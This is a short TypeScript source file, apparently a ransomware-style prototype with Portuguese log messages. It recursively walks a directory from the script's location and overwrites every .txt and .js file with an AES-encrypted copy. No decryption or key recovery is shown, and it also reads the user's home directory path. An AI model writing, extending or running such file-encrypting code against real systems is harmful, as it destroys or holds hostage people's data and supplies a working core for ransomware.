import fsp from "fs/promises";
// import fs from "fs";
import path from "path";
import os from "os";
import aes from "./aes";


async function ReadFile(path: string) {
    const contentFile = await fsp.readFile(path);
    const encrypted = await aes.EncryptedDataAES(contentFile);

    await fsp.writeFile(path, encrypted);
};

async function ReadDir(directory: string) {
    const items = await fsp.readdir(directory);
    for (const item of items) {
        const stat = await fsp.stat(path.join(directory, item));
        const fullPath = path.join(directory, item);
        if (!stat.isDirectory()) {

            if (item.endsWith('.txt') || item.endsWith('.js')) {

                ReadFile(fullPath).then(() => {
                    console.log('Encriptado com sucesso')
                })
            };
        }
        else {
            await ReadDir(fullPath);
        };
    };
};

const home = os.homedir();
ReadDir(__dirname)
